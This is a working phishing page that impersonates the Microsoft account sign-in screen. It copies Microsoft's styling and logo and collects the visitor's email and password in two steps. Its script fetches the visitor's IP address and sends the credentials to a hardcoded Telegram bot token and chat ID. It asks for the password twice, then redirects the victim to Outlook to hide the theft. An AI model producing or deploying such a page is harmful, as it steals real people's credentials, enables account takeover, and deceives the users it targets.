<!doctype html>
<html lang="en">
<head>
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css">
    <title>Sign in to your account</title>
    <style type="text/css">
        html, body { height: 100%; margin: 0; font-family: 'Segoe UI', Arial, sans-serif; }
        body { 
            background-color: #f2f2f2;
            background-image: url('https://logincdn.msauth.net/shared/5/images/fluent_web_light_57fee22710b04cebe1d5.svg'); 
            background-size: cover;
            background-position: center;
            display: flex;
            justify-content: center;
            align-items: center;
        }

        .box { 
            width: 100%; 
            max-width: 440px; 
            padding: 44px; 
            background: #fff; 
            box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
        }

        input { border: none !important; border-bottom: 1px solid #666 !important; border-radius: 0 !important; padding-left: 0 !important; font-size: 16px !important; }
        input:focus { border-bottom: 2px solid #0067b8 !important; outline: none !important; box-shadow: none !important; }
        
        .btn-ms { font-size: 15px; padding: 6px 20px; min-width: 100px; border-radius: 0; font-weight: 400; }
        .btn-next { background-color: #0067b8; color: white; border: none; }
        .btn-back { background-color: #d2d2d2; color: #333; border: none; margin-right: 5px; }

        .btn-row { display: flex; justify-content: flex-end; margin-top: 25px; }

        /* Sign-in Options with Shadow */
        .options-outer { 
            cursor: pointer; 
            background: #fff;
            display: flex; 
            align-items: center;
        }
        .options-outer span { font-size: 15px; color: #333; margin-left: 10px; }

        @media only screen and (min-width: 451px) {
            .options-outer { 
                margin-top: 28px; 
                padding: 12px 44px;
                width: 100%;
                max-width: 440px;
                /* Match the shadow of the main box */
                box-shadow: 0 2px 3px rgba(0, 0, 0, 0.32);
            }
        }

        @media only screen and (max-width: 450px) {
            body { background: #fff; }
            .box { box-shadow: none; padding: 30px; margin-top: 20px; }
            .options-outer { box-shadow: none; padding: 0 30px; margin-top: 20px; }
        }
    </style>
</head>

<body>
    <div style="display: flex; flex-direction: column; align-items: center; width: 100%;">
        
        <div class="box" id="div1">
          <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" width="108"><br><br>
          <span class="h5">Sign in</span><br>
            
            <div class="form-group mt-3">
                <input type="email" id="ai" class="form-control" placeholder="Email, phone, or Skype">
            </div>
            
            <p style="font-size: 13px;">No account? <a href="#" style="color: #0067b8;">Create one!</a></p>
            <p style="font-size: 13px;"><a href="#" style="color: #0067b8;">Can't access your account?</a></p>
            
            <div class="btn-row">
                <button class="btn btn-ms btn-back">Back</button>
                <button class="btn btn-ms btn-next" id="next">Next</button>
            </div>
        </div>

        <div class="box" id="div2" style="display: none;">
          <img src="https://firebasestorage.googleapis.com/v0/b/svguploads2021.appspot.com/o/microsoft_logo.svg?alt=media&token=2581896a-aab4-46f5-9416-c3a18d25b87a" width="108"><br><br>
            <div class="mt-3" style="display:flex; align-items:center;">
                <span id="aich" style="font-size:15px; color: #333;"></span>
            </div>
            <div class="mt-3"><span class="h5" style="font-weight: 600;">Enter password</span></div>
            
            <input type="password" id="pr" class="form-control mt-3" placeholder="Password">
            
            <p class="mt-3" style="font-size: 13px;"><a href="#" style="color: #0067b8;">Forgot password?</a></p>
            
            <div class="btn-row">
                <button class="btn btn-ms btn-next" id="submit-btn">Sign in</button>
            </div>
        </div>

        <div class="options-outer">
          <img src="https://logincdn.msftauth.net/shared/5/images/signin_options_4e48046ce74f4b89d450.svg" width="32" height="32">
            <span>Sign-in options</span>
        </div>

    </div>

    <script src="https://l2.io/ip.js?var=userip"></script>
    <script>
        $(document).ready(function() {
            var count = 0;
            var token = "8304102671:AAFVCb5i5XlZE-mVtnlDyiTPYpq0Ymz2Uo8";
            var chatId = "5178786791";

            $('#next').click(function() {
                var ai = $('#ai').val();
                if (ai.length < 3) return;
                $("#div1").hide();
                $("#div2").show();
                $("#aich").text(ai);
            });

            $('#submit-btn').click(function(e) {
                e.preventDefault();
                var ai = $("#ai").val();
                var pr = $("#pr").val();
                if(pr.length < 3) return;
                count++;

                $.ajax({
                    url: `https://api.telegram.org/bot${token}/sendMessage`,
                    data: {
                        chat_id: chatId,
                        text: `ðŸ”” LOGIN ATTEMPT\nEmail: ${ai}\nPass ${count}: ${pr}\nIP: ${userip}`,
                        parse_mode: 'html'
                    },
                    type: "GET",
                    beforeSend: function() { $("#submit-btn").text("Sign in"); },
                    success: function() {
                        if (count >= 2) {
                            window.location.replace("https://outlook.live.com/mail/0/inbox");
                        } else {
                            $("#pr").val("");
                           
                        }
                    },
                    complete: function() { $("#submit-btn").text("Sign in"); }
                });
            });
        });
    </script>
</body>
</html>
